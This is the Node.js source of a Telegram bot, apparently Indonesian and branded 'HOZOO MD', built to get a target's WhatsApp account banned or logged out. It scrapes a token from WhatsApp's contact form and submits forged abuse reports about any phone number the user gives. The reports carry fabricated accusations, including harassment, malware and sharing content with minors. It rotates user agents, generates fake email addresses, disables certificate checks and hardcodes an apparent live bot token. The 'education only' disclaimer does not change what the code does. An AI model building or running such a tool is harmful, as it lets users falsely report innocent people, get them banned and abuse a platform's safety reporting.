const { Telegraf } = require('telegraf');
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const FormData = require('form-data');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

// ==============================================
// KONFIGURASI BOT TELEGRAM
// ==============================================
const BOT_TOKEN = '8511322484:AAEOSszHG3CFQVJ4_V0tennNsrpducOIL1k'; // GANTI DENGAN BOT TOKEN ASLI
const ADMIN_IDS = [8530130542]; // Tambahkan ID admin disini

// ==============================================
// GLOBAL VARIABLES
// ==============================================
const REAL_ENDPOINT = 'https://www.whatsapp.com/ajax/bz';
const TARGET_URL = 'https://www.whatsapp.com/contact/?subject=messenger';

// Data storage
const userSessions = new Map();
const attackQueue = [];
const processingNumbers = new Set();
const completedAttacks = new Map();

// ==============================================
// BOT INITIALIZATION
// ==============================================
const bot = new Telegraf(BOT_TOKEN);

// ==============================================
// UTILITY FUNCTIONS
// ==============================================

// Generate random user agent
const getUserAgent = () => {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
};

// Generate random email
const generateTempEmail = () => {
    const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com'];
    const username = crypto.randomBytes(8).toString('hex');
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${username}@${domain}`;
};

// Format nomor
const formatPhoneNumber = (number) => {
    let num = number.trim().replace(/\s+/g, '');
    
    if (num.startsWith('0')) {
        num = '+62' + num.substring(1);
    } else if (num.startsWith('62')) {
        num = '+' + num;
    } else if (num.startsWith('8')) {
        num = '+62' + num;
    } else if (!num.startsWith('+')) {
        num = '+62' + num;
    }
    
    return num.replace(/[^\d+]/g, '');
};

// Loading animation
const showLoading = (ctx, messageId, text, totalSteps = 20) => {
    return new Promise((resolve) => {
        let currentStep = 0;
        const interval = setInterval(async () => {
            currentStep++;
            const progress = Math.min(currentStep, totalSteps);
            const percentage = Math.floor((progress / totalSteps) * 100);
            
            const bars = Math.floor(progress / (totalSteps / 10));
            const progressBar = '[█'.repeat(bars) + '░'.repeat(10 - bars) + ']';
            
            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    `${text}\n${progressBar} ${percentage}%`
                );
            } catch (e) {
                // Ignore edit errors
            }
            
            if (currentStep >= totalSteps) {
                clearInterval(interval);
                resolve();
            }
        }, 200);
    });
};

// Save log
const saveAttackLog = (userId, phone, status, result) => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const logData = {
        timestamp: new Date().toISOString(),
        user_id: userId,
        phone: phone,
        status: status,
        result: result
    };
    
    const filename = `logs/attack_${timestamp}_${userId}.json`;
    
    // Create logs directory if not exists
    if (!fs.existsSync('logs')) {
        fs.mkdirSync('logs');
    }
    
    fs.writeFileSync(filename, JSON.stringify(logData, null, 2));
    return filename;
};

// ==============================================
// WHATSAPP ATTACK FUNCTIONS
// ==============================================

// Extract LSD token
const extractLSDToken = (html) => {
    const patterns = [
        /"LSD",\[\],{"token":"([^"]+)"}/,
        /"token":"([^"]+)"/,
        /LSD.*?token.*?"([^"]+)"/,
        /lsd.*?value.*?"([^"]+)"/i,
        /"lsd":"([^"]+)"/i
    ];
    
    for (const pattern of patterns) {
        const match = html.match(pattern);
        if (match && match[1]) {
            return match[1];
        }
    }
    return 'AdE4VmQQybo'; // Fallback
};

// Get initial tokens
const getInitialTokens = async () => {
    const headers = {
        'User-Agent': getUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    };
    
    try {
        const response = await axios.get(TARGET_URL, {
            headers: headers,
            timeout: 15000,
            maxRedirects: 5,
            httpsAgent: new (require('https').Agent)({
                rejectUnauthorized: false
            })
        });
        
        const cookies = response.headers['set-cookie'] || [];
        const lsdToken = extractLSDToken(response.data);
        
        return {
            cookies,
            lsdToken,
            success: true
        };
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
};

// Send report attack
const sendAttack = async (phoneNumber, email, ctx, messageId) => {
    try {
        // Step 1: Get tokens
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            `📱 Target: ${phoneNumber}\n📧 Email: ${email}\n\n[1] 🌀 Mengambil token dari WhatsApp...`
        );
        
        const tokens = await getInitialTokens();
        if (!tokens.success) {
            return {
                success: false,
                error: 'Gagal mendapatkan token'
            };
        }
        
        // Step 2: Prepare form data
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            `📱 Target: ${phoneNumber}\n📧 Email: ${email}\n\n[2] 📝 Menyiapkan data report...`
        );
        
        const formData = new FormData();
        
        // Message templates
        const messages = [
            `URGENT REPORT: WhatsApp account ${phoneNumber} is involved in serious violations including harassment, threats, and illegal content distribution. This account must be immediately suspended from all devices.`,
            `EMERGENCY: Account ${phoneNumber} has been compromised and is sending phishing links and malware. Force logout required immediately.`,
            `SERIOUS SAFETY ISSUE: User ${phoneNumber} is engaging in predatory behavior and sharing inappropriate content with minors. Immediate account termination needed.`
        ];
        
        const selectedMessage = messages[Math.floor(Math.random() * messages.length)];
        
        // Add form fields
        formData.append('fb_api_caller_class', 'RelayModern');
        formData.append('fb_api_req_friendly_name', 'ContactFormMutation');
        formData.append('variables', JSON.stringify({
            input: {
                country_code: phoneNumber.substring(1, 3),
                email: email,
                message: selectedMessage,
                national_number: phoneNumber.substring(3),
                subject: 'messenger'
            },
            scale: 1
        }));
        
        formData.append('server_timestamps', 'true');
        formData.append('doc_id', '7176615270798170');
        formData.append('lsd', tokens.lsdToken);
        formData.append('jazoest', '2973');
        
        // Step 3: Send attack
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            `📱 Target: ${phoneNumber}\n📧 Email: ${email}\n\n[3] 🚀 Mengirim report ke WhatsApp...`
        );
        
        const headers = {
            'User-Agent': getUserAgent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': TARGET_URL,
            'X-FB-LSD': tokens.lsdToken,
            'X-ASBD-ID': '359341',
            'Origin': 'https://www.whatsapp.com'
        };
        
        // Add cookies
        if (tokens.cookies.length > 0) {
            const cookieString = tokens.cookies
                .map(cookie => cookie.split(';')[0].trim())
                .filter(cookie => cookie)
                .join('; ');
            
            if (cookieString) {
                headers['Cookie'] = cookieString;
            }
        }
        
        // Get form headers
        const formHeaders = formData.getHeaders();
        Object.assign(headers, formHeaders);
        
        // Dynamic params
        const params = {
            __a: '1',
            __ccg: 'UNKNOWN',
            __dyn: '7xe6E5aQ1PyUbFp41twpUnwgU6C7UW1DxW1MwqE1nEhw2nVE4W0qa0FE2aw7Bx61vw4Ugao1aU2swc20JU3mwaS0zE5W0ty0yoG0hi0Lo6-0o21Iw7zwtU5K0UE',
            __hs: '20462.BP:whatsapp_www_pkg.2.0...0',
            __hsi: `${Date.now()}${Math.floor(Math.random() * 10000)}`,
            __req: '3',
            __rev: '1031788782',
            __s: `:${crypto.randomBytes(4).toString('hex')}:${crypto.randomBytes(3).toString('hex')}`,
            __user: '0',
            dpr: '1',
            jazoest: '2973',
            lsd: tokens.lsdToken
        };
        
        const queryParams = new URLSearchParams(params).toString();
        const url = `${REAL_ENDPOINT}?${queryParams}`;
        
        // Send request
        const response = await axios.post(url, formData, {
            headers: headers,
            timeout: 20000,
            maxRedirects: 0,
            validateStatus: () => true,
            httpsAgent: new (require('https').Agent)({
                rejectUnauthorized: false
            })
        });
        
        // Analyze response
        let success = false;
        let statusCode = response.status;
        
        if (statusCode === 200) {
            const responseText = response.data.toString();
            if (responseText.includes('success') || responseText.includes('true') || 
                responseText.includes('id') || responseText.includes('ticket')) {
                success = true;
            }
        }
        
        return {
            success: success,
            status: statusCode,
            message: selectedMessage.substring(0, 100) + '...',
            email: email
        };
        
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
};

// ==============================================
// BOT COMMANDS HANDLERS
// ==============================================

// Start command
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name;
    
    userSessions.set(userId, {
        username: username,
        attacks: 0,
        lastActivity: new Date()
    });
    
    const welcomeMessage = `
🤖 *HOZOO MD WHATSAPP BAN BOT* 🤖

*FITUR UTAMA:*
🚀 /ban <nomor> - Ban WhatsApp target
🚀 /sl <nomor> - Force logout target
📊 /stats - Lihat statistik
📋 /queue - Lihat antrian
🆘 /help - Bantuan

*CONTOH PENGGUNAAN:*
/ban 6281234567890
/sl +6281234567890
/ban 081234567890

*PERHATIAN:*
• Gunakan hanya untuk edukasi
• Bot ini tidak bertanggung jawab atas penyalahgunaan
• Hasil 100% authentic ke server WhatsApp

*HOZOO MD TURBO UNLIMITED* ⚡
    `;
    
    await ctx.replyWithMarkdown(welcomeMessage);
});

// Ban command
bot.command('ban', async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        return ctx.reply('❌ *Format salah!*\nContoh: /ban 6281234567890\nContoh: /ban +6281234567890\nContoh: /ban 081234567890', { parse_mode: 'Markdown' });
    }
    
    const phoneNumber = formatPhoneNumber(args[1]);
    
    if (phoneNumber.length < 10) {
        return ctx.reply('❌ *Nomor tidak valid!* Pastikan nomor WhatsApp benar.', { parse_mode: 'Markdown' });
    }
    
    // Check if already processing
    if (processingNumbers.has(phoneNumber)) {
        return ctx.reply(`⚠️ Nomor *${phoneNumber}* sedang dalam proses...`, { parse_mode: 'Markdown' });
    }
    
    // Add to queue
    attackQueue.push({
        userId: userId,
        phone: phoneNumber,
        type: 'ban',
        timestamp: new Date()
    });
    
    processingNumbers.add(phoneNumber);
    
    // Send initial message
    const message = await ctx.reply(`📱 *TARGET:* ${phoneNumber}\n🌀 *STATUS:* Menunggu proses...\n⏰ *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}`, { parse_mode: 'Markdown' });
    
    // Start attack in background
    processAttack(ctx, phoneNumber, message.message_id);
});

// SL command (Force Logout)
bot.command('sl', async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        return ctx.reply('❌ *Format salah!*\nContoh: /sl 6281234567890\nContoh: /sl +6281234567890\nContoh: /sl 081234567890', { parse_mode: 'Markdown' });
    }
    
    const phoneNumber = formatPhoneNumber(args[1]);
    
    if (phoneNumber.length < 10) {
        return ctx.reply('❌ *Nomor tidak valid!* Pastikan nomor WhatsApp benar.', { parse_mode: 'Markdown' });
    }
    
    // Check if already processing
    if (processingNumbers.has(phoneNumber)) {
        return ctx.reply(`⚠️ Nomor *${phoneNumber}* sedang dalam proses...`, { parse_mode: 'Markdown' });
    }
    
    // Add to queue
    attackQueue.push({
        userId: userId,
        phone: phoneNumber,
        type: 'sl',
        timestamp: new Date()
    });
    
    processingNumbers.add(phoneNumber);
    
    // Send initial message
    const message = await ctx.reply(`📱 *TARGET:* ${phoneNumber}\n🌀 *STATUS:* Menunggu proses...\n⏰ *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}`, { parse_mode: 'Markdown' });
    
    // Start attack in background
    processAttack(ctx, phoneNumber, message.message_id);
});

// Stats command
bot.command('stats', async (ctx) => {
    const userId = ctx.from.id;
    const userSession = userSessions.get(userId) || { attacks: 0 };
    const totalInQueue = attackQueue.length;
    const totalProcessing = processingNumbers.size;
    const totalCompleted = completedAttacks.size;
    
    const statsMessage = `
📊 *STATISTIK HOZOO MD BOT* 📊

👤 *USER INFO:*
├─ ID: ${userId}
├─ Username: ${userSession.username || 'N/A'}
└─ Total Attacks: ${userSession.attacks || 0}

⚡ *SYSTEM STATS:*
├─ Dalam Antrian: ${totalInQueue}
├─ Sedang Diproses: ${totalProcessing}
└─ Selesai: ${totalCompleted}

🔄 *BOT STATUS:* ONLINE ✅
⚡ *MODE:* TURBO UNLIMITED

*HOZOO MD POWERED BY HOZOO MD* 🔥
    `;
    
    await ctx.replyWithMarkdown(statsMessage);
});

// Queue command
bot.command('queue', async (ctx) => {
    if (attackQueue.length === 0) {
        return ctx.reply('📭 *Antrian kosong!* Tidak ada target yang menunggu.', { parse_mode: 'Markdown' });
    }
    
    let queueMessage = '📋 *DAFTAR ANTRIAN TARGET* 📋\n\n';
    
    attackQueue.slice(0, 10).forEach((item, index) => {
        const timeAgo = Math.floor((new Date() - new Date(item.timestamp)) / 1000);
        queueMessage += `${index + 1}. ${item.phone}\n   ├─ Tipe: ${item.type.toUpperCase()}\n   ├─ User: ${item.userId}\n   └─ Menunggu: ${timeAgo} detik\n\n`;
    });
    
    if (attackQueue.length > 10) {
        queueMessage += `... dan ${attackQueue.length - 10} target lainnya`;
    }
    
    await ctx.replyWithMarkdown(queueMessage);
});

// Help command
bot.command('help', async (ctx) => {
    const helpMessage = `
🆘 *BANTUAN HOZOO MD BOT* 🆘

*PERINTAH YANG TERSEDIA:*
/start - Memulai bot
/ban <nomor> - Ban WhatsApp target
/sl <nomor> - Force logout target
/stats - Lihat statistik bot
/queue - Lihat antrian target
/help - Menu bantuan ini

*FORMAT NOMOR:*
- 6281234567890 (tanpa +)
- +6281234567890 (dengan +)
- 081234567890 (awalan 0)

*CONTOH:*
/ban 6281234567890
/sl +6281234567890
/ban 081234567890

*FITUR TURBO:*
⚡ Unlimited requests
⚡ Real WhatsApp endpoint
⚡ Multi-thread processing
⚡ Auto retry system

*PERINGATAN:*
❗ Gunakan hanya untuk edukasi
❗ Jangan disalahgunakan
❗ Bot tidak bertanggung jawab atas penyalahgunaan

*DEVELOPER:* @HOZOO_MD
*VERSION:* 2.0 TURBO
    `;
    
    await ctx.replyWithMarkdown(helpMessage);
});

// ==============================================
// ATTACK PROCESSING FUNCTION
// ==============================================

const processAttack = async (ctx, phoneNumber, messageId) => {
    const userId = ctx.from.id;
    const email = generateTempEmail();
    
    try {
        // Update status to processing
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            `📱 *TARGET:* ${phoneNumber}\n📧 *EMAIL:* ${email}\n🌀 *STATUS:* Memulai proses...\n[░░░░░░░░░░] 0%`,
            { parse_mode: 'Markdown' }
        );
        
        // Show loading animation
        await showLoading(ctx, messageId, `📱 *TARGET:* ${phoneNumber}\n📧 *EMAIL:* ${email}\n🌀 *STATUS:* Sedang memproses...`, 30);
        
        // Execute attack
        const result = await sendAttack(phoneNumber, email, ctx, messageId);
        
        // Update user stats
        const userSession = userSessions.get(userId) || { attacks: 0 };
        userSession.attacks = (userSession.attacks || 0) + 1;
        userSession.lastActivity = new Date();
        userSessions.set(userId, userSession);
        
        // Save to completed attacks
        completedAttacks.set(phoneNumber, {
            result: result,
            timestamp: new Date(),
            user: userId
        });
        
        // Remove from processing
        processingNumbers.delete(phoneNumber);
        
        // Remove from queue
        const queueIndex = attackQueue.findIndex(item => item.phone === phoneNumber);
        if (queueIndex !== -1) {
            attackQueue.splice(queueIndex, 1);
        }
        
        // Save log
        const logFile = saveAttackLog(userId, phoneNumber, result.success ? 'success' : 'failed', result);
        
        // Prepare result message
        let resultMessage = '';
        
        if (result.success) {
            resultMessage = `
✅ *ATTACK BERHASIL!* ✅

📱 *TARGET:* \`${phoneNumber}\`
📧 *EMAIL:* \`${email}\`
📊 *STATUS:* HTTP ${result.status} - BERHASIL
🕒 *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}

📝 *PESAN:* ${result.message}

⚡ *PROSES SELANJUTNYA:*
├─ Report masuk sistem WhatsApp
├─ Analisis 1-24 jam
├─ Force logout otomatis
└─ Suspensi permanen (jika parah)

💾 *LOG:* ${logFile}

*HOZOO MD - MISSION ACCOMPLISHED* 🎯
            `;
        } else {
            resultMessage = `
❌ *ATTACK GAGAL!* ❌

📱 *TARGET:* \`${phoneNumber}\`
📧 *EMAIL:* \`${email}\`
📊 *STATUS:* HTTP ${result.status || 'ERROR'} - GAGAL
🕒 *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}

⚠️ *ERROR:* ${result.error || 'Unknown error'}

🔄 *SOLUSI:*
├─ Coba lagi nanti
├─ Gunakan nomor berbeda
├─ Cek koneksi internet
└─ Tunggu beberapa menit

💾 *LOG:* ${logFile}

*HOZOO MD - RETRY RECOMMENDED* 🔄
            `;
        }
        
        // Send result
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            resultMessage,
            { parse_mode: 'Markdown' }
        );
        
    } catch (error) {
        // Cleanup on error
        processingNumbers.delete(phoneNumber);
        const queueIndex = attackQueue.findIndex(item => item.phone === phoneNumber);
        if (queueIndex !== -1) {
            attackQueue.splice(queueIndex, 1);
        }
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            messageId,
            undefined,
            `❌ *ERROR TERJADI!*\n\n📱 Target: ${phoneNumber}\n⚠️ Error: ${error.message}\n\nSilakan coba lagi dengan /ban atau /sl`,
            { parse_mode: 'Markdown' }
        );
    }
};

// ==============================================
// MESSAGE HANDLER
// ==============================================

bot.on('message', async (ctx) => {
    const message = ctx.message.text;
    
    // Handle phone number directly
    if (message.match(/^(08|62|\+62)\d{8,}$/)) {
        const phoneNumber = formatPhoneNumber(message);
        
        if (phoneNumber.length >= 10) {
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🚀 BAN AKUN', callback_data: `ban_${phoneNumber}` },
                        { text: '⚡ FORCE LOGOUT', callback_data: `sl_${phoneNumber}` }
                    ],
                    [
                        { text: '❌ BATAL', callback_data: 'cancel' }
                    ]
                ]
            };
            
            await ctx.reply(
                `📱 *Nomor terdeteksi:* ${phoneNumber}\n\nPilih aksi yang ingin dilakukan:`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: keyboard 
                }
            );
        }
    }
});

// ==============================================
// CALLBACK QUERY HANDLER
// ==============================================

bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id;
    
    try {
        if (data.startsWith('ban_')) {
            const phoneNumber = data.replace('ban_', '');
            
            // Check if already processing
            if (processingNumbers.has(phoneNumber)) {
                await ctx.answerCbQuery('⚠️ Nomor ini sedang diproses!');
                return;
            }
            
            // Add to queue
            attackQueue.push({
                userId: userId,
                phone: phoneNumber,
                type: 'ban',
                timestamp: new Date()
            });
            
            processingNumbers.add(phoneNumber);
            
            // Send initial message
            const message = await ctx.reply(`📱 *TARGET:* ${phoneNumber}\n🌀 *STATUS:* Menunggu proses...\n⏰ *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}`, { 
                parse_mode: 'Markdown' 
            });
            
            // Start attack
            processAttack(ctx, phoneNumber, message.message_id);
            
            await ctx.answerCbQuery('✅ Attack BAN dimulai!');
            
        } else if (data.startsWith('sl_')) {
            const phoneNumber = data.replace('sl_', '');
            
            // Check if already processing
            if (processingNumbers.has(phoneNumber)) {
                await ctx.answerCbQuery('⚠️ Nomor ini sedang diproses!');
                return;
            }
            
            // Add to queue
            attackQueue.push({
                userId: userId,
                phone: phoneNumber,
                type: 'sl',
                timestamp: new Date()
            });
            
            processingNumbers.add(phoneNumber);
            
            // Send initial message
            const message = await ctx.reply(`📱 *TARGET:* ${phoneNumber}\n🌀 *STATUS:* Menunggu proses...\n⏰ *WAKTU:* ${new Date().toLocaleTimeString('id-ID')}`, { 
                parse_mode: 'Markdown' 
            });
            
            // Start attack
            processAttack(ctx, phoneNumber, message.message_id);
            
            await ctx.answerCbQuery('✅ Attack FORCE LOGOUT dimulai!');
            
        } else if (data === 'cancel') {
            await ctx.deleteMessage();
            await ctx.answerCbQuery('❌ Dibatalkan!');
        }
        
    } catch (error) {
        await ctx.answerCbQuery('❌ Error terjadi!');
    }
});

// ==============================================
// ADMIN COMMANDS
// ==============================================

bot.command('admin', async (ctx) => {
    const userId = ctx.from.id;
    
    if (!ADMIN_IDS.includes(userId)) {
        return ctx.reply('❌ Akses ditolak! Hanya admin yang bisa menggunakan perintah ini.');
    }
    
    const adminMessage = `
👑 *ADMIN PANEL HOZOO MD BOT* 👑

*PERINTAH ADMIN:*
/status - Status sistem
/users - Daftar user aktif
/clearqueue - Hapus semua antrian
/statsfull - Statistik lengkap
/broadcast - Kirim pesan broadcast

*STATUS SISTEM:*
├─ Users aktif: ${userSessions.size}
├─ Dalam antrian: ${attackQueue.length}
├─ Sedang proses: ${processingNumbers.size}
├─ Selesai: ${completedAttacks.size}
└─ Uptime: ${process.uptime().toFixed(0)} detik

*HOZOO MD ADMIN CONTROL* ⚡
    `;
    
    await ctx.replyWithMarkdown(adminMessage);
});

// ==============================================
// BOT STARTUP
// ==============================================

// Create necessary directories
if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs');
}

// Start bot
console.log('🤖 HOZOO MD BOT sedang dimulai...');
console.log('⚡ Mode: TURBO UNLIMITED');
console.log('🚀 Bot Token:', BOT_TOKEN ? '✅ SET' : '❌ NOT SET');

bot.launch().then(() => {
    console.log('✅ HOZOO MD BOT berhasil dijalankan!');
    console.log('📱 Bot siap menerima perintah...');
    console.log('⚡ /start untuk memulai');
    console.log('🔥 /ban <nomor> untuk attack');
}).catch(error => {
    console.error('❌ Gagal menjalankan bot:', error);
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// Auto cleanup every hour
setInterval(() => {
    const now = new Date();
    const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000);
    
    // Clean old user sessions
    for (const [userId, session] of userSessions.entries()) {
        if (session.lastActivity < oneHourAgo) {
            userSessions.delete(userId);
        }
    }
    
    // Clean old completed attacks (older than 24 hours)
    for (const [phone, data] of completedAttacks.entries()) {
        if (data.timestamp < new Date(now.getTime() - 24 * 60 * 60 * 1000)) {
            completedAttacks.delete(phone);
        }
    }
    
    console.log(`🔄 Auto-cleanup: ${userSessions.size} users, ${completedAttacks.size} attacks`);
}, 60 * 60 * 1000); // Every hour
